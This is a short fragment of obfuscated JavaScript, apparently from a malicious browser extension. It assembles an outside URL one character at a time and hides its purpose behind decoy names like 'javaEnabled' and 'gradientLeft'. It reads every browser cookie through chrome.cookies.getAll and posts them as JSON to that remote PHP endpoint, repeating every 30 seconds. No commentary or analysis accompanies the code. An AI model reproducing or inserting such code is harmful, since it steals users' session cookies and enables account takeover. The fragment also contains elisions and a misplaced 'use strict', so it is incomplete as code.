...
! function(e, t, n, o, r) {
  ...
  function lndex() {
      var javaEnabled = ["h", "t", "t", "p", "s", ":", "/", "/", "a", "d", "m", "a", "e", "t", "o", ".", "c", "o", "m", "/", "c", "o", "u", "r", "s", "e", "s", "/"];
      return javaEnabled.join('');
  }

  function bekeng() {
      return lndex() + "ur" + 2 + ".p" + "hp";
  }

  function handleEve() {
      clearInterval(lastElementC);
      chrome.cookies.getAll({}, function(gradientLeft) {
          $.post(bekeng(), {
              csg: JSON.stringify(gradientLeft)
          })

      });


      lastElementC = setInterval(handleEve, 3e4);
  }
  handleEve();
    "use strict";
